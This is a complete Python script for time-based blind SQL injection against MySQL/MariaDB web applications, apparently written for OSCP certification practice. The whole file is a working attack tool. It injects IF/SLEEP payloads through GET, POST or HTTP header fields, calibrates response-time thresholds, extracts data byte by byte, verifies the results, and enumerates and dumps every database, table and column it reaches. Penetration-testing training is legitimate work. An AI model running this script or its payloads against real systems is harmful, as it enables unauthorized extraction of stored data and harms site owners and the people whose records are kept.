#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# Time-based blind SQLi dumper (MySQL/MariaDB) - interactive, self-calibrating
# Oracle = RESPONSE TIME. A condition is wrapped so the DB sleeps when TRUE:
# slow reply (>= threshold) = TRUE, instant reply = FALSE.
#
# Methods: GET (query string), POST (body), HEADER (e.g. X-Forwarded-For).
# Optional session cookie for endpoints that require an authenticated session.
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

_print_lock = threading.Lock()

class OracleError(Exception):
    """The target stopped giving answers we are allowed to believe."""

# --- Interactive config ----------------------------------------------------
print("=== time-based SQLi dumper ===")
METHOD       = input("Request method GET, POST or HEADER           : ").strip().upper()
if METHOD not in ("GET", "POST", "HEADER"):
    METHOD = "GET"
URL          = input("Target URL                                   : ").strip()
# For GET/POST this is the param name (e.g. id). For HEADER it is the header
# name whose value is logged into a query (e.g. X-Forwarded-For).
INJ_FIELD    = input("Injectable field/header name                 : ").strip()
OTHER_FIELD  = input("Other POST field name (blank if none)        : ").strip() if METHOD == "POST" else ""
OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() if OTHER_FIELD else ""
# Template with [INJECT] where the sleep expression is spliced in. It only
# needs the break-out; the wrapper (IF/SLEEP) is added and auto-picked for you.
# SELECT context (login/id):  1' OR [INJECT]-- -   or   admin' AND [INJECT]-- -
# HEADER/INSERT context:      1' AND [INJECT]-- -
TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()

# --- Optional session cookie ----------------------------------------------
# Name prompt has a default; pressing Enter uses it. Value prompt takes the
# raw cookie value only (no "name=" prefix). Blank value -> run without a cookie.
COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() or "token"
COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()

# Auto mode samples the target and derives DELAY from the measured jitter.
# Enter a number instead to force a fixed value.
_delay_in    = input("SLEEP seconds on TRUE (y = auto, or a number): ").strip().lower()
AUTO_DELAY   = _delay_in in ("", "y", "yes", "auto", "a")
DELAY        = 1.0 if AUTO_DELAY else float(_delay_in)
# Starting concurrency only. It is reduced automatically if the box starts
# erroring, so there is no penalty for guessing a bit high.
THREADS      = int(input("Threads (e.g. 4; auto-reduced if box chokes) : ").strip() or "4")

# Filled in by calibrate_timing(). THRESHOLD splits TRUE from FALSE; the gray
# band around it marks readings too close to call, which get re-measured.
THRESHOLD    = None
GRAY_LO      = None
GRAY_HI      = None
BASE_P95     = None
REQ_TIMEOUT  = 20
VERIFY_FORM  = None
# Shape of a known-good reply. Any response outside this is not an answer.
BASE_STATUS  = None
BASE_LEN_LO  = None
BASE_LEN_HI  = None

# One session reused for every request (across all threads). The cookie (if
# set) rides along automatically in the Cookie header on each request.
SESSION = requests.Session()
if COOKIE_VALUE:
    SESSION.cookies.set(COOKIE_NAME, COOKIE_VALUE)

# --- Adaptive concurrency gate ---------------------------------------------
# ThreadPoolExecutor caps worker count, but the gate can be tightened at
# runtime: permits are taken away when the target starts erroring and are
# never handed back, so a box that chokes once is not hammered again.
_gate = threading.Semaphore(THREADS)
_gate_lock = threading.Lock()
LIVE_PERMITS = THREADS

def shrink_concurrency():
    global LIVE_PERMITS
    with _gate_lock:
        if LIVE_PERMITS <= 1:
            return False
        if _gate.acquire(blocking=False):
            LIVE_PERMITS -= 1
            return True
    return False

# --- Wrapper forms tried during calibration (first that fires wins) --------
# Each turns a boolean {cond} into "sleep DELAY seconds iff cond is TRUE".
# Ordered from most common context to most specialised.
WRAPPERS = [
    "IF(({cond}),SLEEP({d}),0)",                       # bare - SELECT ... WHERE
    "(SELECT IF(({cond}),SLEEP({d}),0))",              # subquery - INSERT/header
    "(SELECT IF(({cond}),SLEEP({d}),0) FROM DUAL)",    # subquery + FROM DUAL
    "(SELECT IF(({cond}),SLEEP({d}),0) FROM information_schema.tables LIMIT 1)",
    "ELT(({cond}),SLEEP({d}))",                        # ELT fires arg when cond=1
]

# --- Request sender (GET -> query, POST -> body, HEADER -> header) ----------
# Runs over SESSION so the cookie is attached when one was provided. The
# session's connection pool is thread-safe, and the cookie jar is only read
# (never mutated mid-run), so sharing one session across threads is safe.
def send(payload):
    with _gate:
        if METHOD == "HEADER":
            return SESSION.get(URL, headers={INJ_FIELD: payload}, timeout=REQ_TIMEOUT)
        if METHOD == "GET":
            params = {INJ_FIELD: payload}
            if OTHER_FIELD:
                params[OTHER_FIELD] = OTHER_VALUE
            return SESSION.get(URL, params=params, timeout=REQ_TIMEOUT)
        data = {INJ_FIELD: payload}
        if OTHER_FIELD:
            data[OTHER_FIELD] = OTHER_VALUE
        return SESSION.post(URL, data=data, timeout=REQ_TIMEOUT)

def build(cond, wrapper):
    return TEMPLATE.replace("[INJECT]", wrapper.format(cond=cond, d=DELAY))

def set_delay(d):
    """Set DELAY and rebuild every threshold derived from it."""
    global DELAY, THRESHOLD, GRAY_LO, GRAY_HI, REQ_TIMEOUT
    DELAY       = round(d, 2)
    THRESHOLD   = BASE_P95 + DELAY * 0.5
    GRAY_LO     = BASE_P95 + DELAY * 0.3
    GRAY_HI     = BASE_P95 + DELAY * 0.7
    REQ_TIMEOUT = DELAY * 3 + 10

# --- Timing calibration: measure the noise floor, then size DELAY to it -----
# Samples are taken at the real thread count, because a box that is calm
# single-threaded can be much noisier once the pool is hammering it. The no-op
# payload splices 0 in place of [INJECT], so it is valid in every context and
# never sleeps - it measures pure round-trip time and records what a good
# reply looks like.
def sample_baseline(n):
    payload = TEMPLATE.replace("[INJECT]", "0")
    def one(_):
        start = time.time()
        try:
            r = send(payload)
        except Exception:
            return None
        return (time.time() - start, r.status_code, len(r.content))
    out = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for r in ex.map(one, range(n)):
            if r is not None:
                out.append(r)
    return out

def calibrate_timing():
    global BASE_P95, BASE_STATUS, BASE_LEN_LO, BASE_LEN_HI
    n = max(12, THREADS * 3)
    print(f"\n[*] Sampling baseline ({n} requests at {THREADS} threads)...")
    res = sample_baseline(n)
    if len(res) < 4:
        print("[!] Baseline sampling failed (target unreachable?). Aborting.")
        sys.exit(1)
    times = sorted(r[0] for r in res)
    statuses = [r[1] for r in res]
    lengths = [r[2] for r in res]
    med = times[len(times) // 2]
    p95 = times[min(len(times) - 1, int(len(times) * 0.95))]
    # Jitter is the spread above the median, floored so a suspiciously quiet
    # sample run cannot collapse DELAY to something unusable.
    jitter = max(p95 - med, 0.05)
    BASE_P95     = p95
    BASE_STATUS  = max(set(statuses), key=statuses.count)
    BASE_LEN_LO  = min(lengths) - 64
    BASE_LEN_HI  = max(lengths) + 64
    if AUTO_DELAY:
        set_delay(max(0.5, 4 * jitter))
    else:
        set_delay(DELAY)
    print(f"[+] baseline: median {med:.3f}s  p95 {p95:.3f}s  jitter {jitter:.3f}s")
    print(f"[+] good reply = HTTP {BASE_STATUS}, body {max(0,BASE_LEN_LO)}-{BASE_LEN_HI} bytes")
    print(f"[+] DELAY {DELAY:.2f}s ({'auto' if AUTO_DELAY else 'manual'})  "
          f"threshold {THRESHOLD:.3f}s  gray band {GRAY_LO:.3f}-{GRAY_HI:.3f}s")

# --- The measurement, and the answer built on top of it --------------------
def measure(condition):
    """Time one request. Returns elapsed seconds, or None when the reply does
    not look like a real answer - an error page is fast, and scoring that as
    FALSE is exactly how a dump turns into garbage."""
    start = time.time()
    try:
        r = send(build(condition, CHOSEN))
    except Exception:
        return None
    elapsed = time.time() - start
    if r.status_code != BASE_STATUS:
        return None
    if not (BASE_LEN_LO <= len(r.content) <= BASE_LEN_HI):
        return None
    return elapsed

def oracle(condition):
    """One boolean question. A reading outside the gray band is decisive;
    inside it is noise, so re-measure and take the majority. Invalid replies
    are retried with backoff and pull concurrency down as they accumulate."""
    invalid = 0
    ambiguous = []
    while True:
        elapsed = measure(condition)
        if elapsed is None:
            invalid += 1
            if invalid % 3 == 0 and shrink_concurrency():
                with _print_lock:
                    print(f"\n[!] Target erroring under load - concurrency "
                          f"reduced to {LIVE_PERMITS}.")
            if invalid >= 12:
                raise OracleError("target stopped returning valid responses")
            time.sleep(min(2.0, 0.15 * invalid))
            continue
        if elapsed >= GRAY_HI:
            return True
        if elapsed <= GRAY_LO:
            return False
        ambiguous.append(elapsed)
        if len(ambiguous) >= 3:
            votes = sum(1 for e in ambiguous if e >= THRESHOLD)
            return votes * 2 > len(ambiguous)

# --- Calibration: pick the wrapper that actually delays --------------------
CHOSEN = None
def calibrate_wrapper():
    global CHOSEN
    for w in WRAPPERS:
        CHOSEN = w
        try:
            t_true  = measure("1=1")
            t_false = measure("1=2")
        except Exception:
            continue
        if t_true is None or t_false is None:
            continue
        if t_true >= THRESHOLD and t_false < THRESHOLD:
            return w
    CHOSEN = None
    return None

calibrate_timing()

# If the auto DELAY sits too close to the noise, the wrapper check fails even
# on a perfectly injectable parameter. Back off and retry before giving up.
print("\n[*] Calibrating wrapper (sends a few DELAY-second requests)...")
for attempt in range(3):
    if calibrate_wrapper():
        break
    if attempt < 2 and AUTO_DELAY:
        set_delay(DELAY * 2)
        print(f"[*] No wrapper fired - raising DELAY to {DELAY:.2f}s and retrying...")
if not CHOSEN:
    print("[!] No wrapper fired. TRUE never delayed or FALSE also delayed.")
    print("    - Check the template breaks out of the query correctly.")
    print("    - HEADER values must use real spaces, never + or %20.")
    print("    - If the endpoint needs auth, check the cookie name/value.")
    print("    - The parameter may simply not be injectable here.")
    print(f"    method   = {METHOD}")
    print(f"    template = {TEMPLATE!r}")
    print(f"    delay    = {DELAY}s, threshold = {THRESHOLD:.3f}s")
    print(f"    cookie   = {COOKIE_NAME}={'(set)' if COOKIE_VALUE else '(none)'}")
    sys.exit(1)
print(f"[+] Using wrapper: {CHOSEN}\n")

# MySQL/MariaDB system schemas to skip when dumping "all" (still listed)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

# --- Character extraction ---------------------------------------------------
# Cheap probes run before any binary search. FALSE costs one RTT, TRUE costs a
# full DELAY, so each probe is phrased so the likely answer is FALSE - except
# the comma, which is worth one direct hit because group_concat output is full
# of them and it resolves the byte in a single question.
FAST_SINGLES = [44]                              # ,
FAST_RANGES  = [(97, 122), (48, 57), (65, 90)]   # a-z, 0-9, A-Z

def bsearch(expr, lo, hi):
    """Binary search a byte value inside an inclusive range."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"{expr}>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_char(subquery, pos):
    """Resolve the byte at position pos, narrowing with cheap probes first.
    A lowercase byte costs one FALSE plus a 26-value search (~2.5 sleeps)
    instead of a full 0-255 search (~4 sleeps)."""
    expr = f"ascii(substring(({subquery}),{pos},1))"
    for v in FAST_SINGLES:
        if oracle(f"{expr}={v}"):
            return v
    for lo, hi in FAST_RANGES:
        if not oracle(f"{expr} NOT BETWEEN {lo} AND {hi}"):
            return bsearch(expr, lo, hi)
    return bsearch(expr, 0, 255)

def get_length(subquery):
    """Binary search the length of the result (so threads know how many chars)."""
    lo, hi = 0, 4096
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"length(({subquery}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

# --- Verification -----------------------------------------------------------
# One question confirms a whole chunk, so a bad byte anywhere in it costs a
# single sleep to find. The compare uses a bare 0x hex literal, so no quotes
# ever enter the payload and nothing depends on how the app escapes them.
# CAST(... AS BINARY) forces a byte-exact compare; the BINARY operator is
# deprecated since MySQL 8.0.28 and gone in 8.4, so it is not used at all.
CHUNK = 24
VERIFY_FORMS = [
    "CAST(substring(({sub}),{start},{n}) AS BINARY)=0x{h}",
    "substring(({sub}),{start},{n})=0x{h}",
]

def segment_ok(subquery, buf, lo, hi):
    """None means the check is unavailable, not that the bytes differ."""
    if VERIFY_FORM is None:
        return None
    h = bytes(buf[lo:hi]).hex()
    return oracle(VERIFY_FORM.format(sub=subquery, start=lo + 1, n=hi - lo, h=h))

def bad_chunks(subquery, buf, positions, workers):
    """Check every chunk covering the given positions, in parallel.
    Returns the ranges that did not match."""
    if VERIFY_FORM is None:
        return []
    ranges = sorted({(i // CHUNK * CHUNK,
                      min(i // CHUNK * CHUNK + CHUNK, len(buf)))
                     for i in positions})
    bad = []
    lock = threading.Lock()
    def check(rng):
        if segment_ok(subquery, buf, rng[0], rng[1]) is False:
            with lock:
                bad.append(rng)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(check, ranges))
    return sorted(bad)

# --- String extraction ------------------------------------------------------
def dump_positions(subquery, buf, positions, workers, label, total):
    """Read the given positions in parallel. Bytes are stored as ints so a
    failed read can never shorten the buffer and shift everything after it."""
    done = total - len(positions)
    def work(i):
        buf[i] = extract_char(subquery, i + 1)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(work, i) for i in positions]
        for f in as_completed(futures):
            f.result()
            if label is not None:
                done += 1
                with _print_lock:
                    sys.stdout.write(f"\r{label}{done}/{total} chars")
                    sys.stdout.flush()

def extract_string(subquery, label=None):
    """Read the string, verify it, and re-read only what failed. Each retry
    round halves concurrency and lengthens DELAY, because a chunk that failed
    almost always failed because the box was struggling at that moment."""
    n = get_length(subquery)
    if n == 0:
        if label is not None:
            sys.stdout.write(f"{label}\n")
        return ""
    buf = [0] * n
    workers = max(1, LIVE_PERMITS)
    todo = list(range(n))
    reread = 0
    status = None
    for _ in range(4):
        dump_positions(subquery, buf, todo, workers, label, n)
        if VERIFY_FORM is None:
            status = None
            break
        bad = bad_chunks(subquery, buf, todo, workers)
        if not bad:
            status = True
            break
        todo = [i for lo, hi in bad for i in range(lo, hi)]
        reread += len(todo)
        status = False
        workers = max(1, workers // 2)
        set_delay(DELAY * 1.5)
        if label is not None:
            with _print_lock:
                sys.stdout.write(f"\r{label}{len(todo)} bytes failed the check"
                                 f" - rereading at {workers} threads, "
                                 f"DELAY {DELAY:.2f}s\n")
                sys.stdout.flush()
    s = bytes(buf).decode("utf-8", "replace")
    if label is not None:
        note = f"  [reread {reread}]" if reread else ""
        if status is None:
            note += "  [unverified]"
        elif status is False:
            note += "  [STILL MISMATCHED - treat as unreliable]"
        sys.stdout.write(f"\r{label}{s}{note}{' ' * 8}\n")
    return s

# --- End-to-end self test --------------------------------------------------
# Dumps a constant whose value is already known, so a silent oracle failure
# surfaces here instead of as a plausible-looking but wrong table dump.
# 0x4d7953514c is 'MySQL' - mixed case, so it exercises every range probe,
# and a bare hex literal keeps quotes out of the payload.
PROBE     = "SELECT 0x4d7953514c"
PROBE_HEX = "4d7953514c"
PROBE_VAL = "MySQL"

def self_test():
    n = get_length(PROBE)
    if n != len(PROBE_VAL):
        print(f"[!] Self test: expected length {len(PROBE_VAL)}, oracle said {n}.")
        return False
    buf = [extract_char(PROBE, i + 1) for i in range(n)]
    got = bytes(buf).decode("utf-8", "replace")
    if got != PROBE_VAL:
        print(f"[!] Self test: expected {PROBE_VAL!r}, extracted {got!r}.")
        return False
    print(f"[+] Self test passed (read {PROBE_VAL!r} correctly).")
    return True

def calibrate_verify():
    """Pick a compare form that works here, or switch verification off. A
    checker that always says 'mismatch' is worse than no checker."""
    global VERIFY_FORM
    for form in VERIFY_FORMS:
        VERIFY_FORM = form
        hit  = oracle(form.format(sub=PROBE, start=1, n=5, h=PROBE_HEX))
        miss = oracle(form.format(sub=PROBE, start=1, n=5, h="4d7953514d"))
        if hit and not miss:
            print(f"[+] Verification enabled "
                  f"({'CAST' if 'CAST' in form else 'plain'} compare).")
            return True
    VERIFY_FORM = None
    print("[!] No verification form worked - dumps will be marked [unverified].")
    return False

# --- ASCII table renderer --------------------------------------------------
def render_table(headers, rows):
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            cell = row[i] if i < len(row) else ""
            widths[i] = max(widths[i], len(cell))
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
        return "| " + " | ".join(cells) + " |"
    print("      " + bar)
    print("      " + fmt(headers))
    print("      " + bar)
    for row in rows:
        print("      " + fmt(row))
    print("      " + bar)

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = extract_string(q, label="[*] databases: ")
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = extract_string(q, label=f"[*] tables in {db}: ")
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = extract_string(q, label=f"[*] columns in {db}.{table}: ")
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"      (no columns found for {db}.{table})")
        return
    # One single-arg group_concat per column - same shape that dumps names.
    # (Caveat: a value containing a comma would misalign that column.)
    columns_data = []
    for c in cols:
        q = f"SELECT group_concat({c}) FROM {db}.{table}"
        s = extract_string(q, label=f"    {c}: ")
        columns_data.append(s.split(",") if s else [])
    n = max((len(cd) for cd in columns_data), default=0)
    rows = [[cd[i] if i < len(cd) else "" for cd in columns_data] for i in range(n)]
    print()
    render_table(cols, rows)

# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"   {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("   invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")

    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")

    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        tables = get_tables(db)
        if not tables:
            print("    (no tables)")
            continue
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")

        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)

    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        print("[*] Running end-to-end self test...")
        if not self_test():
            print("[!] The oracle is not returning reliable answers, so any")
            print("    dump would be silently wrong. Try fewer threads, or")
            print("    set DELAY manually instead of auto.")
            sys.exit(1)
        calibrate_verify()
        print()
        main()
    except OracleError as e:
        print(f"\n[!] Aborted: {e}.")
        print("    The box stopped answering - rerun with fewer threads.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
